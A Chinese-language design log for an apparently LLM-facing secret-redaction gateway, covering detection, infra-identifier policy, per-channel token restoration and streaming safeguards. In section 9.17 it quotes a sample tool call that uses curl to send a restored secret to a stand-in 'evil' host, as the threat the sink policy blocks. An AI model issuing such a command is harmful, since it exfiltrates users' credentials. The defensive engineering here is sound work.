**④ 归因被弱信号篡改**：更宽的 `gitleaks` span 吸收更窄的 `entropy` 命中后，按"内层优先级最高"规则把自己**改标成 entropy**——弱 detector 抹掉了强 detector。改为 **provider 优先，provider 之间按优先级**。同时把等边界归并从"丢弃较弱一方"改为**标记 `shadowed`**：丢弃会让 policy 再也看不到"硬密钥与 infra 形状共存"这个事实。

### 实测行为

```
commit a1b2...                      → 原样（锚定 GIT_SHA）
image: nginx@sha256:7031…           → 原样（OCI_DIGEST）
trace_id: 4bf92f35…                 → 原样（锚定 TRACE_ID）
sha_alone: a1b2…                    → 脱敏（无锚，infra-uncertain）
card: 4111111111111111              → 脱敏（hard-secret）
DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ  → 脱敏（hard-secret）
```

round-trip 逐字节一致。preserve 不写 mapping（测试断言 `tokenToRaw.size === 0`），因此"保留"是**原样发出**而非"发 token 再还原"。

## 9.15 F4.1 OCI shape-bypass 加固（已实现）

原规则 `(?:sha256:)?${HEX64}` 标为 `hard: true`，于是**裸 64hex 也被算作 hard OCI digest 并获得 preserve 资格**——与"裸 16hex → SPAN_ID"同类的 shape bypass。后果是 `token=<64hex secret>` 会被原样发出。

**拆成两个 hard 变体，没有第三个：**

| 变体 | 条件 | 强度 |
|---|---|---|
| A | span 自身携带 `sha256:` 前缀 | hard，preserve |
| B | span 是裸 hex，但**紧邻其前**的文本以 `sha256:` 结尾（entropy span 只圈住 hex、前缀在 span 外） | hard，preserve |
| C | 两者都不满足 | **soft**：仍分类为 `OCI_DIGEST`，但继续 redact |

**锚点必须紧邻 span**，因此引入 `contextBefore`（锚定到前缀末尾，`/sha256:\s*$/i`）而非"前缀里某处出现过"。否则：

```
previous digest sha256:<hex>  token=<64hex secret>
```

会让前一个 digest 为 token 作保。测试固定这条：相隔另一个值的 `sha256:` **不**使裸 hex 变成 hard。

**分类与豁免分离**：变体 C 的 `disposition` 仍是配置的 `PRESERVE`，但 `decideSpanAction` 要求 **hard 且 allowlisted** 才给豁免，所以 disposition 单独不足以放行。修的是豁免，不是分类——分类仍对 telemetry 和未来 profile 有用。

实测（你要求的七条）：

```
sha256:<64hex>                     → preserve
context endsWith "sha256:" + bare  → preserve
bare 64hex                         → redact
token=<bare64>                     → redact
secret=<bare64>                    → redact
无关前缀含 sha256: 但不相邻           → redact
hard provider detector + OCI 形状   → redact
```

## 9.16 F4.2 certainty 与 disposition 解耦（已实现）

此前 `recogniseInfra()` **返回 `disposition`**，`decideSpanAction()` 读它——等于 recognizer 知道 policy。现在：

```js
recogniseInfra() → { entityClass: "INFRA", infraType, certainty, evidence, confidence }
decideSpanAction({ detector, ruleId, infra, profile })   // profile 在此才被查询
```

- `hard` 改名 **`certainty: "VERIFIED" | "AMBIGUOUS"`**：`hard` 极易与 `HARD_SECRET` 混淆，而两者含义相反（VERIFIED 的 infra 标识**根本不是秘密**）。
- recognizer 返回值里**不存在 `disposition`**，测试断言字段集恰好是那五项。

**判定规则（固定）**：

```
HARD_SECRET                          → 永远 REDACT
VERIFIED infra + profile=PRESERVE    → PRESERVE
AMBIGUOUS infra + profile=PRESERVE   → 拒绝豁免，仍 REDACT
profile=REDACT                       → REDACT
```

**profile v1 只有 PRESERVE / REDACT，不暴露 MASK。** 目前没有 mask 实现，`MASK` 会是一个"表现得像 REDACT 的谎言"。真正的 mask 需要逐类型的保真决策——ARN 保留 service/resource 还是只遮 account id？IP 保留网段？hostname 保留后缀还是 pseudonymise？——没有单一字符串级 mask 能正确回答。测试断言 `INFRA_DISPOSITION` 恰好只有两个值。

`certainty` 按形状是否自证分配：

| VERIFIED | AMBIGUOUS |
|---|---|
| `sha256:<64hex>` | 裸 64hex |
| `commit <40hex>`（锚定） | 裸 40hex |
| `trace_id: <32hex>`（锚定） | 裸 32hex |
| `span_id: <16hex>`（锚定） | （裸 16hex **不 claim**） |
| `arn:aws:…` | 12 位 account id |
| `i-`/`subnet-`/`sg-`… 前缀 | 私网 IP |

**ARN 尤其说明为什么必须拆**：它被判 VERIFIED（"是不是 ARN"毫无疑义），而默认 profile 选择 REDACT（"能否发给模型"是策略）。若为了默认脱敏而把 recognizer 写成 AMBIGUOUS，就是**把策略决定伪装成身份存疑**。

### 两条实测记录的限制

1. **disposition 只对"某个 detector 已产出 span"的值生效。** infra recognizer 是注解层，自身不产候选：一个不含任何凭据的裸 ARN 在**任何 profile 下都原样通过**（含默认 profile，其 `AWS_ARN` disposition 是 REDACT）。让 infra 成为独立 detector 是另一个决定，本刀刻意不做。
2. **前缀落在 span 外时需要逐类型变体。** `i-0a1b2c3d4e5f67890` 整串是 VERIFIED，但熵检测器只圈住 hex 段、把 `i-` 留在 span 外，而裸 hex 是 AMBIGUOUS ⇒ 实例 ID 今天仍会被脱敏。OCI 的同类问题由变体 B（`contextBefore`）解决，EC2 前缀尚无对应变体。

## 9.17 G0 / P0 响应路径的 sink 策略端到端强制（已实现）

**这是本设计第一次真正成为安全边界。** 此前 `classifyRestore()` 只有定义、**零生产调用点**：响应路径直接调用 `restoreJson()` / `ctx.restoreText()`，所以模型回吐到 tool call 里的 token **会被直接换成明文**：

```
模型返回:  {"tool_calls":[{"function":{"arguments":"{\"cmd\":\"curl https://evil/?x=CRG_ABCDEF_0001\"}"}}]}
实际交付:  {"tool_calls":[{"function":{"arguments":"{\"cmd\":\"curl https://evil/?x=<真实密钥>\"}"}}]}
```

### 通道策略（在解析任何 token **之前**由 sink 决定）

这一点决定了它能否用于流式：tool argument 的 delta 是逐片到达的，逐 token 判定要等 token 完整，而那时可能已经发出一部分。

| 通道 | 已知自有 token | 未知 protected token |
|---|---|---|
| `assistant_text` | RESTORE | 原样交付（inert 文本） |
| `tool_argument`（operand） | **PRESERVE** | **BLOCK** |
| `shell` / `network_egress` / `database` / `email` | **PRESERVE**（不代入秘密） | **BLOCK** |
| 其它/未知通道 | PRESERVE | 原样交付 |
| 显式声明的 trusted sink | RESTORE | — |

**通用 tool argument 默认不还原**，否则模型只要调用任意自定义 tool 就能把凭据搬出恢复边界。

### 协议感知的响应路由

不再让 `restoreJson()` 无脑递归还原：

```
OpenAI:   choices[].message.content / delta.content            → assistant_text
          choices[].message|delta.tool_calls[].function.arguments → tool_argument
          output_text / output[].content[].text                 → assistant_text
          output[].function_call.arguments                      → tool_argument
Anthropic: content[].text / text_delta                          → assistant_text
          content[].tool_use.input / input_json_delta            → tool_argument
```

流式的每个字段在 `streamFields()` 阶段就被打上 sink 标签（按 **path** 判定，因为同一 delta 信封里既有正文也有操作数），由此**通道级**决定策略、累积后再交付。

### action 语义（统一为"交付了什么"）

```
restore   文本被改写（token → 明文）
preserve  文本原样交付（含敏感通道下保留 token）
block     内容被替换为标记，因为无法解析
```

早期版本把敏感通道一律报成 `block`，混淆了"没有代入秘密"与"拒绝了什么"。mode 单独报告，用来说明原因。

### 旧测试的修正

按你的要求，把固定旧行为的绿测改成安全契约测试：

- `known token restores in both assistant text and tool arguments` → 拆为"prose 还原"与"**tool argument 不还原**"；
- `assistant prose and tool arguments are handled identically today` → 改为"**不再相同**"；
- `Anthropic partial_json deltas restore placeholders` → 改为"**token 被保留**"，并新增 `text_delta` 仍还原的对照，证明流式层不是一律不还原。

### 端到端实测

```
assistant text（应还原）      → 含明文 ✅
tool_calls（不得泄漏）        → 不含明文 ✅
trusted broker（可还原）      → 含明文 ✅
```

## 9.18 G0.1 Protocol + Ownership Closure（已实现）

G0 之后剩下两个 P0 gap，本刀收口。

### ① Responses SSE 的 operand 路由

原实现：「字段名叫 `delta`」⇒ `assistant_text`。于是 `response.function_call_arguments.delta` 被当正文还原。**字段名不构成关于 sink 的陈述**——同一信封里 `.output_text.delta` 是正文、`.function_call_arguments.delta` 是 shell 命令。

改为 **event type × field path** 决定 sink：

| 事件 | sink | 字段 |
|---|---|---|
| `response.output_text.delta` / `refusal.delta` / `reasoning_text.delta` / `reasoning_summary_text.delta` | assistant_text | `delta` |
| `response.function_call_arguments.delta` | tool_argument | `delta` |
| `response.function_call_arguments.done` | tool_argument | `arguments` |
| `response.mcp_call_arguments.delta` / `.done` | tool_argument | `delta` / `arguments` |
| `response.custom_tool_call_input.delta` / `.done` | tool_argument | `delta` / `input` |
| **未识别事件** | **tool_argument（保守默认）** | 全部字符串叶子 |

**未识别事件不得因字段名叫 `delta` 自动获得 RESTORE 权限**——这是本刀明确固定的一条。

### ② ownership 三分法回到交付策略

G0 把 `ForeignTokenRegistry` 从实际路径弄掉了：`classifyRestore()` 收参数、`applySinkPolicy()` 不读、`handleRequest()` 无 plumbing。三分法只在单元测试里可达——正是 G0 本身要修掉的"helper 正确、生产没接线"形态。

**两个实现缺陷**（都会让 registry 静默失效）：

1. `applySinkPolicy` 从未接收 registry；
2. `classifyTokensIn` 用 `REDACTED_TOKEN` 正则找 token，而**外来 token 不是 CRG 形状**，根本匹配不到——即使参数传到了也永远判不出 FOREIGN_REGISTERED。现在同时按 `registry.tokens` 与 namespace matcher 扫描。

契约（实测穿过生产路径）：

```
FOREIGN_REGISTERED + assistant_text                 → PRESERVE（不重写）
FOREIGN_REGISTERED + untrusted tool_argument        → BLOCK
FOREIGN_REGISTERED + shell/network/database/email   → BLOCK
FOREIGN_REGISTERED + trusted broker                 → PRESERVE
                                                      （本层无 mapping，故不能 restore）
```

`handleRequest` 现在从 `options.foreignRegistry` 取值并下传到**两条**响应路径、`applyResponsePolicy`、`SseRestorer` 的通道策略。

### 修正一条名实不符的测试

`a registered foreign token is blocked in an untrusted sensitive sink` 原本断言「token 仍被交付」——测试名说 blocked、断言说 delivered。G0.1 之后它确实被 refuse，测试名与断言已一致。

### 端到端测试

`test/g01-protocol-ownership.test.js` 共 8 条，全部穿 `handleRequest()`，覆盖三种 operand delta、三种 operand done、未识别 delta 事件、registered foreign 在正文/操作数/trusted 三种通道、以及**未登记的 token 形状值在操作数里必须被拒**。

## 9.19 G1 Streaming Representation / Ownership Closure（已实现）

`possibleTokenSuffixLength()` 此前只认本层方言（CRG + legacy），因此三种受保护形态**跨 delta 会被拆成碎片交付**：

| 形态 | 状态 |
|---|---|
| OWN portable token | 已支持 |
| legacy token | 已支持 |
| OWN base64 surrogate | **断裂** |
| FOREIGN exact token | **断裂** |
| FOREIGN namespace token | **断裂** |

### holdback 资格同样来自权威，不来自形状

```
OWN surrogate   → ledger（本请求铸造过的精确可见串）
FOREIGN         → registry（精确登记，或 namespace 的 streamPrefix）
dialect         → 本层 token 形状
```

**"看起来像 base64 就缓存"被明确拒绝**——"像"不是所有权，且会让每个 base64 块都产生停顿。测试断言：未登记的 base64 不产生任何 holdback。

### 命名空间前缀是声明的，不是推导的

从任意 regex 反推"当前后缀是否可能成长为匹配项"不可靠，也不值得写 partial matcher。因此 registry 增加显式 `streamPrefix`：

```js
{ name: "acme", pattern: /.../, streamPrefix: "ACME_" }
```

前缀只用于 holdback；**所有权仍由完整 matcher 决定**。

### 三个实现陷阱（都会静默拆散 token）

1. **`slice(0, k)` 的 k 上界**：`"ACME_".slice(0, 4)` 是 `"ACME"` 而非 `"ACME_"`，把上界设成 `length - 1` 时永远测不到声明的前缀本身。
2. **锚点判定必须独立于循环**：`v ACME_AB` 的最长前缀匹配是 `ACME_AB`（7 字符），只看它就完全错过锚点 `ACME_`；两者必须分别判定并取较大值。
3. **"matcher 认可" ≠ "token 已结束"**：`ACME_[A-Z0-9_]{4,}` 接受 `ACME_ABCD`，于是上半截被提前放行、客户端收到两段。任意 pattern 是否还能延续**不可判定**，因此 `streamPrefix` 的语义定为"**该 issuer 的 token 会延续，直到不再到达**"，最终由 `SseRestorer.finish()` 释放。

代价有界且显式：以歧义尾结束的通道在**流结束时**强制释放，绝不静默丢弃。

### 待定期间不得消费 records

原实现即使"保持"，也已把 `ch.text` 追加掉、把事件排队——而 `safe` 标志不会再被设置，事件永久卡住。改为**待定期间不消费该 channel 的 records**，让后续 delta 汇入同一累积，在首个"完成"事件处一次性交付。重新组装的内容落在**该 run 的第一条记录**上、其余清空，因此只交付一次。

### 实测

```
surrogate 全切分（19 个位置）      → ✅ 全部还原
exact foreign 全切分（23 个位置）  → ✅ 全部保留
namespace foreign 全切分（16 个位置）→ ✅ 全部保留
assistant_text  → restore  ✅
tool_argument   → preserve ✅
trusted broker  → restore  ✅
```

## 9.20 G0.2 + G1.1（已实现）

### G0.2 Anthropic `tool_use.input` 递归 operand walker

原实现只遍历第一层 string 键，因此**嵌套一层的 operand 会被当作正文还原**：

```json
{"headers": {"auth": "<token>"}}   // 漏
{"args": ["a", "<token>", {...}]}  // 漏
```

改为递归 walker（`applyOperandPolicy`）：对象与数组任意深度遍历，只改写字符串，就地修改以保持 wire 形状。非字符串标量（数字、布尔）不动。

### G1.1 holdback 区分三类，不再一律当 prefix anchor

| 类别 | 来源 | 语义 |
|---|---|---|
| OWN exact surrogate | ledger | **exact literal** |
| exact registered foreign token | registry.tokens | **exact literal** |
| namespace `streamPrefix` | registry.namespaces | **open-ended anchor** |

**exact literal**：

```
proper prefix 到达   → HOLD
完整 literal 到达    → RELEASE（policy 已可执行）
完整 literal + 普通字符 → 更应 RELEASE
```

**不得因为 exact literal 曾出现于 buffer 就一直 hold 到 stream finish。** 这是上一版的真实缺陷：`partialPrefixLength("v CRG_GKLIDD_0001")` 返回 15，通道被拖到 `finish()` 才交付。

**namespace 需要显式声明边界**（不从 regex 推导，继续"由 registry 声明 streaming contract"的原则）：

```js
{ streamPrefix: "ACME_", streamContinuation: /[A-Z0-9_]/, streamMaxLength: 128 }
```

```
ACME_ABCD              → 仍可能继续 → HOLD
ACME_ABCDEF_0001 + 空格 → continuation 结束 → 交完整 matcher 判 ownership → RELEASE
ACME_ + 10MB 的体        → 达到 streamMaxLength → RELEASE（否则整个 channel 积压到流结束）
```

**`streamMaxLength` 是必须的**：没有它，`ACME_` 后跟任意长的 continuation 字符会把整个 channel 缓冲到流结束。

本层方言（CRG / legacy）仍走原有的 shape-aware suffix 逻辑（`possibleTokenSuffixLength`），不并入 exact-literal matcher——它是**带结构的**，`CRG_` 只是结构的一部分。

### 增量交付测试（关键）

只 `await response.text()` 的测试**无法区分**"增量交付"与"全部拖到 finish 再一次性输出"——后者也会全绿。因此新增一条测试：upstream 发送"完整 surrogate + 空格"后**保持连接不关闭**，gateway 的 reader 必须在 2 秒内读到输出。实测通过。

## 9.21 G2 Infra Envelope Resolution + Ledger Closure（已实现）

### 根因：detector boundary ≠ entity boundary

```
instance: i-0a1b2c3d4e5f67890
          └──── 熵检测器 span ────┘
          └──────── 实体 ─────────┘
```

`H` 只产生"看起来随机的一串字符"，因此对实例 ID 它报的是 **hex 段**。`recogniseInfra(spanText)` 看到的是 `0a1b2c3d4e5f67890`，判不出任何东西，前缀被留在外面——交付文本甚至被拆成 `i-CRG_...`。

**这不是"EC2 缺 anchor"**。逐个补 `contextBefore`（OCI 一个、EC2 一个、K8s 一个……）治的是症状。修法是**在分类之前把 span 解析到其所属实体**。

### 表驱动的 envelope 规则

每条规则声明如何向左/向右扩展，扩展有界，且**扩展结果必须被 recogniser 接受**（否则规则算猜错，保留原 span）：

| 类型 | 左扩展 | 右扩展 |
|---|---|---|
| `EC2_RESOURCE_ID` | `i-` / `subnet-` / `sg-` / `ami-` … | hex 串 |
| `OCI_DIGEST` | `sha256:` / `sha256@` | hex 串 |
| `INTERNAL_HOSTNAME` | 域名标签前缀 | 标签字符 |
| `K8S_RESOURCE_NAME` | 名称前缀 | 名称字符 |

### 扩展后必须重新归并

这是实现上的关键点：扩展后的 span **包含**原检测器 span，若不重新归并，原窄 span 会与它并存并可能赢下局部替换——`i-CRG_...` 正是这么产生的。因此 envelope 解析后**再跑一次 containment merge**。

### Ledger closure

envelope 归因写入实体账本（`infraType` / `infraCertainty`），`entityClassFor()` 据此返回 `INFRA`。没有这一步，策略层已经判定为 `EC2_RESOURCE_ID`，账本却仍答 `UNKNOWN`。

修的过程中发现**账本构造时把这两个字段丢弃了**（参数传进来了，entry 里没有），所以仅接线不够。

### 实测

```
默认 profile（strict）:
  EC2/Subnet/SG/AMI ID   → 脱敏（整体替换，无 i- 残留）  infra=EC2_RESOURCE_ID  class=INFRA
  镜像 digest / commit    → 原样（VERIFIED + allowlist）
  裸 64hex（无锚）         → 脱敏  infra=OCI_DIGEST（AMBIGUOUS）class=INFRA
  真密码 / GitHub PAT     → 脱敏  class=CREDENTIAL（单调性保持）

devops profile:
  所有 VERIFIED 的 infra 标识 → 原样
  裸 64hex（AMBIGUOUS）      → 仍脱敏
  真密码 / GitHub PAT        → 仍脱敏
```

### 测试修正

两条测试的夹具本身是**形状歧义**的（32 位 hex 恰好是 trace-id 形状），G2 之后被正确地判为 `TRACE_ID`，因此测试失败的原因是夹具选得不好，而不是行为回归。改用**非 infra 形状**的熵值作为"entropy-only"夹具，并新增一条测试记录"32hex 在有锚/无锚下分别判 TRACE_ID"现在是有意行为。

F4.2 那条 limitation 测试（"前缀在 span 外需要逐类型变体"）已改写为 G2 契约：实例 ID 现在被整体解析。

## 9.22 G3 Legacy dialect 完整移除（已实现）

**半兼容状态本身就是弱点。** 之前 legacy `{{Redact:<64hex>}}` 是"输入时豁免的形状"——而该形状**可任意伪造**，等于任何人写一层壳就能让检测跳过其中的值。这与前面修掉的 `CRG_AAAA_AAAA` 形状绕过是同一个错误。

### 已删除（生产代码中不再存在）

```
LEGACY_TOKEN_PREFIX / LEGACY_TOKEN_RE / LEGACY_TOKEN_LENGTH
legacyRedactToken()
protectedTokenPatterns 的 legacy 条目
legacy re-mint 通道
legacy restore 分支
legacy stream holdback
REDACTED_TOKEN / REDACTED_TOKEN_ONE / PROTECTED_TOKEN_LIKE_RE 的 legacy 分支
```

`own dialect = CRG v2 only`，`shape ≠ ownership`。

### 验收

```
worker.js 中 '{{Redact:'      0 处
worker.js 中 'LEGACY_TOKEN'   0 处
worker.js 中 'legacyRedactToken' 0 处
```

关键回归：`DB_PASSWORD={{Redact:<64hex>}}` 现在**只是普通输入**，是否脱敏完全由正常 detector / structured context 决定（实测：被 `binding` 检出并脱敏，无豁免）。`isRedactedText("{{Redact:...}}")` → `false`；SSE `{{Reda` / `{{Redact:` → 不 holdback。

### 测试改造

`legacy-token-compat.test.js` → `legacy-token-removal.test.js`，只证明两件事：**generation 只有 v2**、**legacy-looking payload 没有特殊权限**（含不在导出中、`isRedactedText` false、不 holdback、operand 通道不因它 block）。删除全部"legacy restore / dual dialect restore / re-mint"兼容测试。

其他文件中把 `{{Redact:...}}` 当"未知 token 形状"用的夹具，改为未登记的 v2 形状 `CRG_UNKNOWN_0001`——它们测的是"本层不拥有的 token"，与方言无关。

`nested-dlp` 里那条 **KNOWN TRANSITIONAL GAP** 测试改为"该 gap 已关闭"。

### 附带发现（记入 Release Hardening）

对 `DB_PASSWORD={{Redact:<64hex>}}` 这种输入，entropy/binding 的 span 是 `[21,87)`——**把结尾的 `}}` 也包含进去了**，因此输出为 `DB_PASSWORD={{Redact:CRG_...`。安全上没有问题（原值已删除、无豁免），但交付文本不整洁，且说明 detector 边界会跨过 `}}` 这类标点。这不是 legacy 方言的性质（方言已删），而是 detector 的一般边界行为，留待 hardening 处理。

## 9.23 R0.1 Structural Boundary Closure（已实现）

### 根因不是 legacy

```
DB_PASSWORD={{Redact:<64hex>}}
→ DB_PASSWORD={{Redact:CRG_...
```

链路是：parser 识别整个 value 为 `reference_value` → **binding candidate 被过滤**（模板是指代，不是秘密）→ 但 **inner detector 仍然运行** → 只替换 reference 内部那一段 → 语法半开。

### 正确规则：parser 提供边界，不等于 parser 下 verdict

```
reference 本身                          → 不是 secret verdict
reference 中无其它 detector hit          → 原样保留
reference 中有真实 detector hit          → reference boundary 成为 structural envelope
                                          → 整个 construct 成为 mutation boundary
                                          → detector attribution / hard evidence 保留
```

这与 block scalar 的思路一致。

### 通用实现，没有 `{{Redact:` 特殊规则

`referenceEnvelopes()` 用**平衡分隔符扫描器**识别 construct（不是模板语言的特例表）：`${{ }}`、`{{ }}`、`${ }`、`$( )`、`%VAR%`、`<VAR>`、`{var}`。

- 最长 opener 优先，**嵌套被正确处理**（`${{ a: {b:1} }}` 不会在内层 `}` 提前闭合）
- **未闭合的 construct 不返回**——`${` 未闭合只是普通文本，当作边界会把无关内容卷进来
- 只返回**最外层** construct：替换内层而留下外层 `${{` 就是又一次半开
- 简单形态（`%VAR%` `<VAR>` `{var}`）要求 body 是纯名字，避免散文里的 `%` 或比较运算符 `<` 误开区域

### "盒子变了，判定没变"

span 扩到 envelope 后，**分类仍跑在 detector 实际识别的原文上**（`classifiedText`）。没有这一步，`commit: "{{ <sha> }}"` 因为放宽后的文本含括号与空格而不再被识别为 git sha，导致 devops profile 会把本该保留的 sha 静默脱敏。

### 实测（全部 round-trip byte-identical）

```
DB_PASSWORD=${SECRET}                    → 原样
DB_PASSWORD=${{ secrets.DB_PASSWORD }}   → 原样
DB_PASSWORD={{ vault_password }}         → 原样
DB_PASSWORD=%DB_PASSWORD% / <VAR>        → 原样
block scalar 内的 ${{ }}                  → 原样
DB_PASSWORD={{Redact:<64hex>}}           → DB_PASSWORD=CRG_...
PASSWORD="{{ wrapper <real PAT> }}"      → PASSWORD="CRG_..."
x: ${{ secrets.<PAT> }}                  → x: CRG_...
blob: "{{ <64hex> }}"                    → blob: "CRG_..."
token: "{{ <PAT> }}"  # rotate quarterly → token: "CRG_..."  # rotate quarterly（注释与引号保留）
```

## 9.23.1 R0.1.1 Fixture sanity：一处**未经验证的归因**

9.23 初稿把 `DB_PASSWORD=$(op read op://vault/db/password)` 被替换归因于"`op://vault/db/password` 是 INTERNAL_HOSTNAME 命中"。**这个归因是错的，且我从未验证过。**

打印真实判定链后：

```
findSensitiveSpans  → []                      无任何 detector 命中
recogniseInfra("op://vault/db/password")        → null（不是以 .internal/.local/.svc 结尾的点分主机名）
recogniseInfra("//vault/db/password)")          → null
recogniseInfra("vault.db.local")                → INTERNAL_HOSTNAME / VERIFIED
policy               → 无决策
out                  → 原样
```

**真实根因是 YAML parser 把 shell 赋值当成了 YAML mapping。** 旧正则 `^([ \t]*)([^\s:#][^:#]*?)[ \t]*:[ \t]*([\s\S]*)$` 在 URL 的 `op:` 处切分：

```js
'DB_PASSWORD=$(op read op://vault/db/password)'
→ yaml: key = 'DB_PASSWORD', raw = '//vault/db/password)'   ← 完全错的
→ strength = strong → binding span → 脱敏
```

即**一个指向密钥的引用被当成密钥明文脱敏了**，而且只覆盖了行的一部分。

修正：**`:` 后没有空白就不是 mapping 分隔符**（YAML 规范）。例外是 unquoted scalar 不得以 `/` 或 `$` 起头，这条把 `token:ghp_xxx`（紧凑 mapping）与命令代换区分开。

修正后该样本**保持原样**——这正是应有的目标行为（secret reference ≠ secret plaintext）。

`R0.1.1 fixture sanity` 测试把这条链逐项断言（含 `parseYamlBindings(line).length === 0` 与 `bindingSpansOf` 为 0），使归因不能再漂移。

## 9.23.2 R0.1.2 Reference Scanner Hardening（已实现）

### ① `%...%` 的"纯名字"约束**实际没有生效**

构造表里是 `{ opener: "%", closer: "%", simple: true }`——**没有 `namePattern`**，而 simple 分支只做 `if (found.namePattern && ...)`。于是文档声称的"简单形态要求 body 是纯名字"对 `%` **完全没在生效**：

```
50% CPU, <secret>, 60% memory
└────────────────────────────┘   ← 两个普通百分号之间被当成一个 envelope
```

若中间有 hard detector hit，会把整段散文一起替换。修正：

```js
{ opener: "%", closer: "%", simple: true, namePattern: /^%[A-Za-z_][A-Za-z0-9_]*%$/ }
```

实测：`%DB_PASSWORD%` / `%_x%` / `%A%` → envelope；`50% CPU, token=xyz, 60% memory` / `%1abc%` / `100% done` → 无 envelope。

**夹具歧义（记录）**：`<ghp_...>` **本身**是合法的 `<VAR>` 形态，因此会产生 envelope（凭据连同尖括号一起被替换）。这是 `<VAR>` 规则的正常结果、结果仍然正确，但它意味着"散文里的百分号"测试夹具不能顺手用尖括号包凭据——否则测的不是 `%`。

### ② `${{ ... }}` 的"平衡扫描"其实没有平衡内层 `{}`

旧实现只对**相同 opener** 增计数：

```js
if (text.startsWith(found.opener, j)) depth++;
```

对 `${{` 而言，内部的单个 `{` 不可见，于是：

```
${{ a: {b:1}}}   →  闭合在前两个 } 处  →  ${{ a: {b:1}}   ← 孤立 } 留在 envelope 外
```

带空格的 `${{ a: {b:1} }}` 只是碰巧能过（内层 `}` 与外层 `}}` 没挨着），**不代表 scanner 真的 balanced**。

修正：引入 `delimiter`（闭合分隔符长度），`owed` 计"还欠几个闭合字符"，**同类型的内部 `{` 也计入**：

| 构造 | delimiter |
|---|---|
| `${{` / `{{` | 2 |
| `${` / `$(` | 1 |

实测全部完整覆盖（含括号计数与开闭平衡）：`${{ a: {b:1} }}`、`${{ a: {b:1}}}`、`${{a:{b:1}}}`、`${{a:{b:{c:1}}}}`、`${{ a: {} }}`、`${ {a:1} }`、`${{{{{a}}}}}`。

### ③ 明确收窄的 contract（不堆字符串特判）

scanner 数的是**花括号与分隔符**，不做词法分析，因此**引号内的花括号不区分**：

```
x: ${{ a: "}" }}   →  envelope 覆盖 ${{ a: "}" }，一个 } 留在外面
```

要正确处理需要针对具体模板语言的完整词法分析，而本 scanner **故意不是**。因此 contract 明确为：

> **reference envelope 是"花括号平衡"的构造。引号内的花括号不被区分，因此含字符串内非平衡花括号的构造不被可靠识别。**

**后果必须相对两个不同的参照物分别说明**（此前写成"envelope 偏短只会替换更多、span 变宽"，**方向说反了**）：

```
相对 detector span:
    envelope 仍可能是 WIDEN —— mutation 范围比检测器识别的那一段更大

相对真正的 reference construct:
    提前闭合的 envelope 是 UNDER-COVER —— 覆盖不足

current known consequence:
    已检测到的 secret 字节仍然会消失（confidentiality 未破）
    但宿主语法可能被留下不完整（syntax integrity 无保证）

therefore:
    无已知 confidentiality fail-open
    quoted-brace 情形下 syntax integrity 不做保证
```

"替换更多"只在**相对 detector span** 时成立；相对构造本身它是**覆盖不足**。两句混用会让读者以为 envelope 错误只会过度替换、不会遗漏——那正是最需要避免的误读。测试同时断言"在 contract 内的所有括号位置变体均完整覆盖"。

## 9.24 R0.2 Spec / Test / Runtime Contract Sync

做法：机械抽取三类来源（`DESIGN-v2.md`、`test/*`、`worker.js` 中表达 contract 的注释与 `REDACT_NOTICE`）中的可验证断言，逐条对照当前实现，而不是通读猜。

### 机械检查结果

| 检查 | 结果 |
|---|---|
| 导出符号总数 | 84 |
| 文档引用的常量枚举 × 实现成员 | **一致**（无文档遗漏成员） |
| 熵阈值文档数值 `length=9 → 5.4240`、`length=17 → 5.1502` | **精确匹配** |
| infra 分类表（40/32/16-hex × bare/anchored × 两种 profile） | **11 条全部一致** |
| 注释中的**悬空交叉引用** | **1 处：`INFRA_POLICY`** |
| `worker.js` 注释中的 CJK 混入 | **1 处**：`much larger误伤面` |
| 生产代码中 legacy 方言残留 | 0（见 9.22） |
| 测试标签 | `[GREEN NOW]` 196 / `[RED]` 57 / `[COUPLING]` 4 / **未标注 42** |

结论：**文档与实现没有行为性漂移**（所有可机械验证的行为断言都成立），漂移集中在**生产注释**与**标签完整性**。

> **R0.2.1 更正**：上面这个结论**下早了**。机械检查覆盖的是"符号/常量/表格数值"这类可抽取的断言，因此漏掉了三处**散文形式的 current-contract 矛盾**——notice 与 sink policy 冲突、§6.5 与实现冲突、R0.1.2 limitation 方向说反。见 9.25。教训：**机械抽取只能覆盖结构化断言，散文断言需要按"每处 claim 都问它今天是否还成立"来过一遍**，而那一步当时没有做。

### 已修

1. **悬空交叉引用**：`// Policy is a separate layer (see INFRA_POLICY below)` —— `INFRA_POLICY` 常量已不存在（策略现在是 `decideSpanAction` + profile）。改为指向真实符号。
2. **CJK 混入英文注释**：`a much larger误伤面` → `a much larger false-positive surface`。

### 记录（未修，属规范性而非正确性）

3. **`REDACT_NOTICE` 正文未进设计文档**。它是**运行时对模型的承诺**，且已被 `proxy.test.js` 断言，但文档从未写出它的正文。补录如下：

   > Sensitive values are redacted before forwarding, including messages, tool inputs, and tool results. You may see CRG_ tokens; treat them as opaque and preserve them exactly. Do not decode, modify, or invent CRG_ tokens. Whether a token is restored, preserved, or blocked depends on the output channel and trust policy; do not assume that tool arguments can resolve tokens.

   **R0.2.1 更正**：此处最初记录的正文末句是 "placeholders you emit in text or tool calls are restored to the original secrets"，该句在 G0 之后**已不成立**——不受信任的 tool argument 对已知 token 是 **PRESERVE**、对无法解析的 token 是 **BLOCK**，只有 assistant 正文或显式 trusted broker 才 RESTORE。已按真实 sink policy 改写（见 9.25）。

   现在的四句各对应一条契约：**注入范围**（messages / tool inputs / tool results）、**token 不透明性与精确保留**、**禁止解码/修改/编造**、**结果取决于 channel 与 trust policy**。语义契约测试见 `test/notice-contract.test.js`——**刻意不做全文字符串冻结**，文案可继续优化，安全语义不能退化。

4. **42 条测试无标签**。标签约定是 `[GREEN NOW]`（现状）/ `[RED]`（目标）/ `[COUPLING]`（耦合约束）；未标注集中在 `core` / `entropy` / `gitleaks` / `proxy` / `stream` / `node-server` / `http-integration` 这些较早的文件。这不是缺陷，但意味着"这条测试在固定现状还是规格"无法从名字判断。

## 9.25 R0.2.1 Contract Truth Pass（已实现）

R0.2 的机械检查漏掉了**三处明确的 current-contract 矛盾**，全部是散文形式的断言。

### ① `REDACT_NOTICE` 与 G0 sink policy 冲突

notice 末句原为 "placeholders you emit in text or tool calls are restored to the original secrets"——**G0 之后不成立**。真实语义：

```
assistant prose      OWN → may RESTORE
untrusted tool_arg   OWN → PRESERVE ；unknown / foreign → may BLOCK
trusted broker       OWN → may RESTORE
```

一句话承诺"tool calls 会还原"会诱导模型把凭据写进 tool call，然后在未解析时表现为无法解释的工具错误。已按真实策略改写，并**不做全文字符串冻结**，改为语义契约测试 `test/notice-contract.test.js`：

- 必须称 token 为 opaque、要求 preserve exactly
- 必须禁止 decode / modify / invent
